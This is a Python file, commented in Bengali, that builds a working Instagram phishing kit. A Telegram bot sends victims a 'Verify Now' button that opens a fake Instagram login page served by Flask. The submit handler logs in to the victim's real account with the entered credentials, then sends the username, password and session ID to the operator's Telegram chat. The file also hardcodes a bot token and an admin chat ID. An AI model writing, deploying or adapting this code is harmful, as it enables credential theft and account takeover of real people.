import os
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from instagrapi import Client

# ==========================================
# এখানে আপনার তথ্যগুলো বসান
BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
ADMIN_CHAT_ID = '5428249457'
WEB_APP_URL = 'https://hlo-world.onrender.com/' 
# ==========================================

# --- ১. টেলিগ্রাম বট সেটআপ ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please verify your account to continue:", 
        reply_markup=reply_markup
    )

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("Bot is running...")
    app.run_polling()

# --- ২. ওয়েবসাইট সেটআপ (ইনস্টাগ্রামের মতো ডিজাইন) ---
web_app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 30px; width: 320px; text-align: center; border-radius: 3px; }
        .logo { font-family: 'Billabong', cursive; font-size: 40px; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
        input:focus { outline: none; border: 1px solid #a8a8a8; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
        .error { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
        .success { color: #0095f6; font-size: 14px; margin-top: 15px; display: none; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; margin: 0 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">Instagram</div>
        <form action="/submit" method="POST" onsubmit="showLoading()">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
        <div class="divider">OR</div>
        <p style="color: #385185; font-size: 14px; font-weight: bold; cursor: pointer;">Forgot password?</p>
        
        <div id="errorMsg" class="error"></div>
        <div id="successMsg" class="success"></div>
    </div>

    <script>
        function showLoading() {
            document.getElementById('loginBtn').innerText = "Logging in...";
            document.getElementById('loginBtn').disabled = true;
        }
    </script>
</body>
</html>
"""

@web_app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@web_app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    try:
        # with_challenge_flow=False দিলে ইনস্টাগ্রামের চেক এরর কমে যায়
        cl = Client(with_challenge_flow=False)
        cl.login(username, password)
        session_id = cl.sessionid
        
        # আপনার টেলিগ্রামে ডেটা পাঠানো
        send_to_telegram(username, password, session_id)
        
        # ইউজারকে সাকসেস মেসেজ দেখানো
        return render_template_string(HTML_PAGE.replace('<div id="successMsg" class="success"></div>', '<div class="success" style="display:block;">Login Successful. You can close this window.</div>'))
        
    except Exception as e:
        # লগইন ফেইল হলে এরর মেসেজ দেখানো
        error_html = f'<div class="error" style="display:block;">Sorry, your password was incorrect. Please double-check your password.</div>'
        return render_template_string(HTML_PAGE.replace('<div id="errorMsg" class="error"></div>', error_html))

def send_to_telegram(user, pw, sess_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"🔔 **New Instagram Login**\n\n👤 User: `{user}`\n🔑 Pass: `{pw}`\n🔗 Session: `{sess_id}`"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

# --- ৩. Render এ বট চালু রাখার ব্যবস্থা ---
threading.Thread(target=run_bot, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    web_app.run(host='0.0.0.0', port=port)
